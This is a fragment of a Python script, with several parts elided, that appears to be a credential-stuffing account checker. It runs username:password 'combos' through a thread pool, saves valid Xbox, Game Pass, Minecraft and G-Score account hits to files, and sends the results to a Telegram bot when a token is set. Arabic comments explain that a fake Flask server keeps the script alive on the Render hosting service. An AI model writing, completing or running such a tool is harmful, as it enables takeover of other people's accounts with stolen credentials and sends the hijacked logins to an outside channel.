...
def main():
    ...
    if total_combos == 0:
        print(f"\n{RED} [!] No combos found in the file.{RESET}")
        return
    ...
    threads = min(threads, total_combos)
    ...
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        for combo in combos:
            executor.submit(check_account, combo)
    ...
    print(f"{WHITE} - Saved in: {session_folder}{RESET}")
    print(f"{WHITE} - All valid accounts: XBOX-Valid.txt{RESET}")
    print(f"{WHITE} - Game Pass accounts: XBOX-GamePass.txt{RESET}")
    print(f"{WHITE} - Minecraft accounts: Minecraft-Hits.txt{RESET}")
    print(f"{WHITE} - G-Score accounts: G-Score-Hits.txt{RESET}")
    print(LINE)
    
    if BOT_TOKEN and CHAT_ID:
        send_session_results()
    else:
        print(f"{YELLOW} [!] تم تخطي الإرسال إلى تليجرام (لم يتم إعداد التوكن){RESET}")
    
    print(f"\n{GREEN} [+] تم الانتهاء بنجاح!{RESET}")

if __name__ == "__main__":
    # تشغيل سيرفر الـ Flask الوهمي في الخلفية أولاً لكي يستجيب لـ Render
    keep_alive()
    
    # تشغيل البرنامج أو السكربت الأساسي
    main()
